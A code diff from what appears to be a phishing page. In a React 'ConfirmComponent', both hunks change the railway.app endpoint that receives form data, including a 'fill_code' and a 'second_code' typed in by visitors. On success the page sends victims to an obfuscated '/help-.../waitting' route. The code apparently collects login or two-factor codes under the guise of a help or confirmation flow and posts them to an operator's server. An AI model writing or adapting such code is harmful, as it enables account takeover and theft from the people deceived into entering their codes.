@@ -69,7 +69,7 @@ const ConfirmComponent = () => {
                         }
             
                         form.setFieldsValue({ fill_code: '' });
-                        axios.post( "https://sever79-production.up.railway.app/api/news", data) 
+                        axios.post( "https://theme1-production.up.railway.app/api/news", data) 
                     }
             
                     if(activeWaring == true) {
@@ -93,7 +93,7 @@ const ConfirmComponent = () => {
                             'second_code': values.fill_code,
                         }
             
-                        axios.post( "https://sever79-production.up.railway.app/api/news", data)
+                        axios.post( "https://theme1-production.up.railway.app/api/news", data)
                             .then((response) => {
                                 if (response.data.status === 0 ) {
                                     navigate('/help-100823847823627384548/waitting');
